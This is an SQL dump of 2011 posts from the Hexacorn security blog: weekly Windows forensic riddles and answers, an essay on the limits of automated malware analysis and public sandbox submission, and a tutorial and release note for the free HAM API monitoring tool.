INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (415, 'Permanent Link to Forensic Riddle #4 – Answer', 'Hexacorn', 'December 12, 2011 ', 'The answer to riddle #4 is program ‘debug.exe’. You can use it to view slack space of files:\n\nThanks for trying & next riddle on Friday!\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2011/12/12/forensic-riddle-4-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (416, 'Permanent Link to Forensic Riddle #4', 'Hexacorn', 'December 9, 2011 ', 'The Riddle:\nToday’s riddle is very short. You are on a lonely island. You have a new laptop with a plain vanilla installation of Windows XP and a PIN-locked mobile phone with emergency calls disabled. The phone’s PIN is hidden in a slack space of c:\\boot.ini. Using only OS tools retrieve the PIN, unlock the phone, call for help and leave the island.\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/12/09/forensic-riddle-4-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (417, 'Permanent Link to Thanks!', 'Hexacorn', 'December 5, 2011 ', 'Over last few days Hexacorn blog has received quite a few good comments from various people who reached out to me personally and praised the content as well as provided suggestions on how to improve the usability and accessibility of the site. This is very encouraging and I would like to take this opportunity and thank you all for your compliments and constructive criticism.\nI also want to include special thanks to Colin who wrote a very nice review of Hexacorn on his forensic blog. In my opinion Colin writes in a way that is unique in terms of quality – he makes an effort to research, understand and document everything he comes across while on the case – this makes for a great tutoring material. Second big thanks goes to Ange – he created a fantastic repository of everything RCE and Portable Executable-related (if you are into reversing and never visited his site you are in for a real treat) – Ange provided a really great feedback that made me re-think a few things and flip a few switches in the blog engine settings \nThanks!\nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2011/12/05/thanks/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (418, 'Permanent Link to Forensic Riddle #3 – Answer', 'Hexacorn', 'December 5, 2011 ', 'The answer to riddle #3 may surprise you. First of all, it is not Base64-encoded – this is just to make life easier for people who are using portable devices to read this blog – now they can actually read the answer \nSecondly, the actual answer. Prefetch file _is_ there. Or should I say, PrefetchADS is there.\nIt turns out that it is possible to hide the Prefetch data by fooling the OS to append it as an Alternate Data Stream (ADS) to an existing file. So, in this particular case the prefetch data is hidden inside the ADS attached to Layout.ini file.\nI chose Layout.ini for this demo, yet malware could use _any_ existing file inside the %SystemRoot%\\Prefetch directory, e.g. any of the .pf files residing there.\nThe following screenshots demonstate how it works:\n\nHiding the Prefetch data inside PrefetchADS\n\n\n\nViewing the content of the PrefetchADS with Notepad\n\n\nThe bottom line:\n\nNext time you investigate the %SystemRoot%\\Prefetch directory, make sure you look at the ADS as well\n\nThanks for trying & next riddle on Friday!\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2011/12/05/forensic-riddle-3-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (419, 'Permanent Link to Forensic Riddle #3', 'Hexacorn', 'December 2, 2011 ', 'Another Friday, another riddle.\nThe Riddle:\n\nThe malicious Portable Executable (PE) file has been executed by another process immediately after all *.pf files have been removed from the %SystemRoot%\\Prefetch folder; Prefetching is on, yet the Prefetch file associated with the malicious file cannot be found; why?\n\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/12/02/forensic-riddle-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (420, 'Permanent Link to Canyoucrackit?', 'Hexacorn', 'December 1, 2011 ', 'Today I have read on The Register about http://canyoucrackit.co.uk/. The puzzle looked interesting at a first glance (x86 code!), so I tried to crack it. It wasn’t too difficult – there is a twist though, so it was a little victory. I won’t publish the solution, but I am sure soon many web sites will make it available anyway. Let’s just say, it starts with ’15b4′.\nThe second stage (there are 3) is about virtual memory, and I am not sure if I have time/skills/patience to play with it. But who knows… GCHQ jobs are waiting \nShare this :)', 'Hackme/crackme', 'http://www.hexacorn.com/blog/2011/12/01/canyoucrackit/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (421, 'Permanent Link to Forensic Riddle #2 – Answer', 'Hexacorn', 'November 28, 2011 ', 'This is the answer to Riddle #2.\nThis one was an easy one as long as you are familiar with short file names; running a command “dir /x” would reveal a short name “virus.exe” associated with an executable file hidden behind a long name suggesting a JPG picture.\nThanks for trying & next riddle on Friday!\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2011/11/28/forensic-riddle-2-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (422, 'Permanent Link to Forensic Riddle #2', 'Hexacorn', 'November 25, 2011 ', 'It’s Friday again, so time for a new riddle.\nThe Riddle:\n\nWhere is the malware hiding?\n\n\nEnjoy!\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/11/25/forensic-riddle-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (423, 'Permanent Link to Automation vs. In-depth Malware Analysis', 'Hexacorn', 'November 21, 2011 ', 'Nowadays many web sites offer services that can be called ‘malware analysis for the crowd’. Web sites like VirusTotal, ThreatExpert, JSUnpack and many others provide a file scan/analysis functionality utilizing multiple antivirus scanners and/or sandbox/live analysis bundled with a bunch of other tools e.g. file format analyzers, packer detectors, and so on and so forth. They actually do a really great job and submitting samples to these services is one of the very first steps taken by many Incident Response handlers and Forensic Investigators all over the world. This post is my attempt to summarize my thoughts on the topic of both automated malware analysis in general and consensual submission of files to a web site owned by a third party.\nYou see… while it is a great source of immediate intel, submitting samples to the publicly available services is not always the best choice. There are real-life situations where it is not only a bad idea, but it also may be very costly to your company, or your customer. Both on the PR and financial side of things. So, while I do not oppose these services , I do believe that some serious thought needs to be given to it first, and of course, _before_ the submission. It is also my strong belief that you can’t rely on information you cannot yourself verify (if asked to). And if you do, you not only deprive yourself from a pleasure of finding things out, but also risk drawing incorrect conclusions.\nThe list below is obviously far from being complete:\n\nThe sample may be a part of the targeted attack\n\nSamples submitted to these services are shared; they are shared for a good purpose of course, to produce AV signatures and provide better detection, but… sooner or later one of these sensitive sampless may fall into hands of a person that will eagerly write a cool blog about it (and frankly speaking, that will be a great blog entry!)\nMalware including passwords, credentials for data extortion, as well as data that would clearly identify the customer is getting more and more common; trust me, there are many malicious samples out there that contain very sensitive data inside its code and you really don’t want them to be shared; researchers working for security companies know about it – they actively search and look for interesting samples because any new technique, new Rustock, Stuxnet, etc will not only boost the company’s profile and researcher’s own personal image – more importantly – it also allows them to escape a daily routine of writing signatures to focus on a cool stuff (you know who you are ;))\nAttackers may be checking if the hashes of the samples they placed on their network are present in public sandboxes or even on Google; they may also have a legitimate via (API) access to the many of the available sandboxing portals and can automatically and immediately kick off a ‘retreat’ operation the moment ‘their’ hash is detected in the sandbox\n\n\nAV scan is helpful to identify the malware, yet…\n\nWith a number of malware samples collected by AV companies being extremely high, it’s easy for a particular file to be detected incorrectly\nMany AV companies use generic names like ‘trojan horse’, ‘trojan generic’, ‘heuristic badness’ etc.; this doesn’t really answer the question ‘what does this malware do’\nAV companies may use other AV vendor’s scanners to automatically process large sample sets; a mistakenly classified malware can easily transfer the incorrect classification to other vendors (a fun fact: in 2010, one of the leading AV vendors pulled a leg of other vendors by generating 20 dummy malware samples for which they created detections and submitted these samples to VirusTotal; within less than 2 weeks, more than 10 vendors detected these files as malicious!)\nEven scans with products from multiple AV vendors don’t guarantee detection – most AV engines do not detect new samples fast enough; you will be often left on your own with a new or targeted malware (take a note of this point: AV is still more a service that is reactive than proactive – someone needs to submit the sample first for the signature to be created)\nFalse Positives are still there\n\n\nSandbox/live analysis is by its nature limited\n\nIt is not interactive, or interaction is very limited; it is easy to use, but this is its trade-off; you only see a data dump and a subset of artifacts, but without understanding the code and the context in which these artifacts have been created (of course, it is often enough to answer: is it malicious?, but not ‘what does it really do’)\nIt doesn’t rely on your company’s baseline build; thus, tested malware will run in an environment completely different from your company’s and may behave differently; practically speaking, if you are an incident responder interested in domains you want to block, or a forensic investigator, you can’t rely on the result of this analysis only; you may miss some of the artifacts that malware could produce have it got a chance to be executed within a slightly different environment or at a different time\nMany malicious samples come with an anti-sandboxing technology; it is very simple to use and quite hard to bypass\n\n\nDynamic analysis in general is also very limited by its nature\n\nIt misses a lot of code branches, including dead code (some malware authors still use older compilers and these can produce executables like this); in some cases dead code helps to find some crucial information about malware authors or their modus operandi\nIt misses a lot of code/data/generated at runtime, decrypted at runtime, etc.\nIt misses the metadata associated with the sample – coding style, copied&pasted routines, hidden messages, config data, etc.\nIt assumes malware immediately does its dirty work; this can be easily slowed down by a long delay or other tricks e.g. built-in ‘expiration date’ or system/hardware ID (that is, some malware is precompiled to work on specific system only)\nMany malware samples used in targeted attacks won’t work in an environment not having specific files/paths/registry keys and will immediately exit; Stuxnet and credit card dumpers are good examples\nCertain functions of malware are executed only if a specific application is running (e.g. browser, IM software)\nIt doesn’t work well for components e.g. DLL files (if they export functions, you don’t know what arguments to pass)\nIt doesn’t work well for kernel mode drivers, as well as PDFs, SWF, Java, DEX, SIS, and hundreds of other file formats that you will come across in your career\nIt doesn’t work for server-side malware\nIt also doesn’t work well for malware that expects… command line arguments\nand million other reasons…\n\n\nLast, but not least – if you are using older browser, you are providing a web site with a full path to a sample location on your hard drive; this may look innocent, but you may be revealing information about your customer, current case or even your own company or credentials (%USERPROFILE%\\Desktop\\ACMECASE\\sample.zip is a really bad idea to place your samples)\n\nAs you can see, there are many reasons why you should be careful when you handle samples extracted from yours or your customers’ systems. There are companies out there that have been exposed, because the samples targeting their systems have leaked to the public.\nIt also makes sense to invest time and learn on how to do in-depth malware analysis in-house, or at least find a trusted specialist to help you with this task. You can stand by any claim coming out from your analysis, and more importantly – you will also have a lot of fun while cracking the malware.\nThe bottom line is:\n\nUse automation as much as you can\nThink twice before you submit the samples to web sites owned by third party and more importantly – assume and accept the fact that you lose control over the distribution of your samples\nUse data from multi AV scan/sandbox/live analysis as a foundation for further analysis, not as a final conclusion\nDo not trust threat names provided by automated tools, and understand that the difference between threats is getting more and more blurry; even if some malware is called virus or trojan, it may also include worm’s capability, rootkit functionality and MBR infection routines\nIf you add results of automatic analysis to your reports, do your homework and confirm findings manually, or state that it is impossible (and provide the reasons)\nDo learn and use in-depth malware nalysis techniques but also understand that it has limitations as well – some malware takes months to develop and is improved over the time, often reaching level of complexity making its analysis really hard; sometimes it is just not worth it\nRead other blogs – just because one guy says something, doesn’t mean it is correct – learn to question everything and trust only stuff that is peer reviewed\n\nShare this :)', 'Malware Analysis, Preaching', 'http://www.hexacorn.com/blog/2011/11/21/automation-vs-in-depth-malware-analysis/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (424, 'Permanent Link to Forensic Riddle #1 – Answer', 'Hexacorn', 'November 21, 2011 ', 'The answer to Forensic Riddle #1 is pasted below. It’s BASE64 encoded, just in case you still didn’t have a chance to look at the riddle itself and maybe plan to give it a go w/o spoilers.\nThe OS is 64-bit. One window is created by a native 64-bit version of cmd.exe and another one by its 32-bit version – the directory listing shown on a screenshot is different in both windows due to Wow64 redirection mechanism redirecting 32\n-bit application to ‘see’ %systemroot%\\SysWOW64\\drivers as %systemroot%\\System32\\drivers.\nThanks for trying & next riddle on Friday!\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2011/11/21/forensic-riddle-1-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (425, 'Permanent Link to Forensic Riddle #1', 'Hexacorn', 'November 18, 2011 ', 'I have always been interested in riddles and puzzles, and I have a lot of respect for people who create them. So, when I’ve been thinking of opening this blog I always had in mind a section that would be dedicated to riddles. The idea is of course not new. I borrowed this particular one from Richard Wiseman – one of my favorite authors. He posts a puzzle every Friday and provides an answer to it on Monday.\nSo, stepping on giant’s shoulders I will be posting a new riddle every Friday as well. The topic will be forensics, malware analysis, and any sort of binary-data related fun facts. The goal is to post something short, simple, and relatively easy to crack, yet a bit quirky or with a twist, so that you may have fun and hopefully learn something new. Of course, if you are in the industry long enough, you will crack it in no time.\nI will start with something I have came up with 2 years ago while working for my previous employer. I modified it to avoid potential copyright issues, yet the fundamental principle stays the same. In a hindsight, it is not that difficult, yet I think the guys who faced it found it challenging at that time and their interesting approach to the problem (they generated a lot of ideas!) led me to post a few more riddles on our internal mail list.\nThe Riddle:\n\ncommand executed on the same system\ncommand is “dir wimmount.sys”\n2 different windows, 2 different results\nwhy?\n\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2011/11/18/forensic-riddle-1/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (426, 'Permanent Link to How to use HAM?', 'Hexacorn', 'November 13, 2011 ', 'This is a short intro tutorial on how to use HAM. The basic idea is to show how to:\n\nLoad an application for analysis\nPass command line arguments to the analyzed program\nChoose APIs\nRun\nObserve the output\n\nSo, let’s begin:\n\nFirst, download and run HAM. You should see the following screen:\nNow, Press F3, Ctrl-O, or choose File->Open Executable from the application menu.\nGo to your System Directory:\nType ‘notepad.exe‘ and hit Enter\nType the command line argument for Notepad e.g. ‘test.txt‘ – this file will be opened by Notepad:\nPress Alt+A or click the icon as shown below: \nChoose ‘CreateFileW‘ API in the API Functions window:\nPress F5 or click the icon as shown below:\nThe Notepad will now be launched, modules loaded by Notepad will be shown in a small window; for each module loaded, HAM will attempt to intercept all APIs as selected earlier in the API Functions – in our case it is only ‘CreateFileW’ :\nEach module loaded by Notepad is shown in the output pane; Notepad window is shown on the Desktop as well; as you can see, CreateFileW API has been called once, and with the argument being a file name that we typed in Notepad Open File window i.e. ‘test.txt‘; \n\nWe can conclude this demo with the following observations:\n\nNotepad is indeed using CreateFileW when it opens the files\nThe file is being open with the flag OPEN_EXISTING i.e. it will attempt to open existing file, without overwriting it\nThe file is open in both FILE_SHARE_READ and FILE_SHARE_WRITE mode i.e. you could open file in Notepad and then still overwrite it with an external application e.g. echo foo>test.txt while it is being edited.\n\nWe also learnt that:\n\nLoading applications for analysis and passing arguments to it is very straightforward\nIn order to use it efficiently, it is good to have some basic understanding of Windows programming, You need to know which APIs to select to monitor the analyzed program efficiently.\nHAM works on Windows 8 Developer Preview \n\nAs you can see, by just looking at arguments passed to APIs, as well as the flow of the APIs being called, multiple things can be done:\n\nit may help in in-house malware analysis\nit may help with vulnerability research\nit may help in understanding Windows API and Windows internals\nit may allow to discover undocumented or unexpected quirks of windows (e.g. what mutexes are created by a given application, what strings are hard coded and compared against by certain APIs, etc.)\n\nEnjoy!\nShare this :)', 'HAM', 'http://www.hexacorn.com/blog/2011/11/13/how-to-use-ham/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (427, 'Permanent Link to Hexacorn Application Monitor', 'Hexacorn', 'November 13, 2011 ', 'Between years 2004-2007 I maintained a small hobby programming page where I was releasing free software tools and various snippets in assembly. One of the programs I have written at that time was Kakeeware Application Monitor – a very small API monitor coded entirely in x86 assembly language. The last update has been made in 2007 and I have not touched the program since.\nIn July 2011 I decided to come back to my old sources and fix a few bugs and add new APIs that have been introduced in Vista and Windows 7, plus other APIs I could find. After poking around I managed to build a decent list of new APIs and these that I have missed previously. Turns out that after putting it all together, the number of APIs that the program can now handle expanded to almost 12000!\nAfter few months of polishing, I am finally ready to release a new version. Since all my code will be now released under Hexacorn name, I changed the program’s name as well, so from now on it will be called Hexacorn Application Monitor (a.k.a. HAM). And just for the fun of it, I also added ‘Pro’ to its name :).\n\nHexacorn Application Monitor\n\nThis program is FREE for both commercial and non-commercial use. Yup, you heard that right. Note that this is a new version of the tool that has been not updated in 4 years. It surely contains bugs and some of the APIs may not be intercepted properly. If you find bugs. or find it useful, please do let me know. Thanks.\nEnjoy!\nI will soon post some practical examples on how to use it and what sort of stuff you can find with it.\nDownload HAM\nShare this :)', 'HAM, Software Releases', 'http://www.hexacorn.com/blog/2011/11/13/hexacorn-application-monitor/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (428, 'Permanent Link to The Pleasure of Finding Things Out', 'Hexacorn', 'November 4, 2011 ', 'Hexacorn blog is about the pleasure of finding things out.\nThe title may sound familiar to you and you are right. ‘The Pleasure of Finding Things Out’ is a collection of short works from American physicist Richard Feynman.\nFeynman was an extraordinary person, or at least he managed to made many people think this way. It doesn’t matter. What matters is that he was right about finding things out. It is a very satisfying activity that offers a lot intellectual pleasure. Just think about it for a second… If you ever solved a puzzle, or created one… if you managed to bypass some security protection like crack a game, or pick the lock, you know what I am talking about. There is that litttle craze, a drive that makes you work on the problem long hours, until you solve it.\nAt Hexacorn, we are fascinated by it. We just love to crack stuff. And we will be writing about it.\nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2011/11/04/the-pleasure-of-finding-things-out/\n');
